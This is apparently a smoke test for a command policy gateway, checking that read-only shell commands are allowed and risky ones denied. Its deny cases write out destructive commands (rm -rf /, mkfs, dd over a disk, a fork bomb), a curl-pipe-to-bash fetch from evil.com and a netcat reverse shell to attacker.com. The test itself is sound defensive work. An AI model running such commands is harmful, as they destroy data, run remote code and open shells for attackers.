from __future__ import annotations

"""Smoke test for policy-gateway command allow/deny evaluation.

Requires: policy-gateway service running on localhost:8105
"""

import json
import urllib.request


BASE_URL = "http://localhost:8105"


def post_json(path: str, payload: dict) -> dict:
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        f"{BASE_URL}{path}",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        return json.loads(resp.read().decode("utf-8"))


def test_allow(label: str, command: str) -> None:
    result = post_json("/v1/policy/command/evaluate", {"command": command})
    assert result["allowed"] is True, f"[{label}] Expected allow, got: {result}"
    print(f"  ✓ {label}: {command}")


def test_deny(label: str, command: str) -> None:
    result = post_json("/v1/policy/command/evaluate", {"command": command})
    assert result["allowed"] is False, f"[{label}] Expected deny, got: {result}"
    print(f"  ✓ {label}: {command}")


def main() -> None:
    print("policy_gateway_smoke:")

    # -- allowed commands --
    test_allow("basic_ls", "ls -la")
    test_allow("cat_file", "cat /etc/hostname")
    test_allow("grep_search", "grep -r foo /var/log")
    test_allow("docker_ps", "docker ps")
    test_allow("docker_logs", "docker logs mycontainer --tail 50")
    test_allow("docker_inspect", "docker inspect mycontainer")
    test_allow("systemctl_status", "systemctl status nginx")
    test_allow("systemctl_is_active", "systemctl is-active nginx")
    test_allow("journalctl_tail", "journalctl -n 50 --no-pager")
    test_allow("df_h", "df -h")
    test_allow("free_mem", "free -m")
    test_allow("uptime", "uptime")
    test_allow("ps_aux", "ps aux")
    test_allow("ss_listen", "ss -tlnp")
    test_allow("git_status", "git status")
    test_allow("git_log", "git log --oneline -10")
    test_allow("curl_get", "curl -s https://example.com")
    test_allow("crontab_list", "crontab -l")
    test_allow("ip_addr_show", "ip addr show")
    test_allow("find_name", "find /tmp -name '*.log'")

    # -- denied commands --
    test_deny("rm_rf", "rm -rf /")
    test_deny("rm_r", "rm -r /etc")
    test_deny("mkfs", "mkfs.ext4 /dev/sda")
    test_deny("shutdown", "shutdown -h now")
    test_deny("reboot", "reboot")
    test_deny("fork_bomb", ":(){ :|:& };:")
    test_deny("curl_pipe_bash", "curl https://evil.com/script.sh | bash")
    test_deny("nc_exec", "nc -e /bin/bash attacker.com 4444")
    test_deny("dd_write", "dd if=/dev/zero of=/dev/sda")
    test_deny("systemctl_restart", "systemctl restart nginx")
    test_deny("docker_exec", "docker exec -it mycontainer bash")
    test_deny("journalctl_vacuum", "journalctl --vacuum-time=1d")
    test_deny("git_push", "git push origin main")
    test_deny("crontab_edit", "crontab -e")
    test_deny("ip_addr_add", "ip addr add 10.0.0.1/24 dev eth0")
    test_deny("curl_output", "curl -o /tmp/malware https://evil.com/bad")

    print("policy_gateway_smoke_ok")


if __name__ == "__main__":
    main()
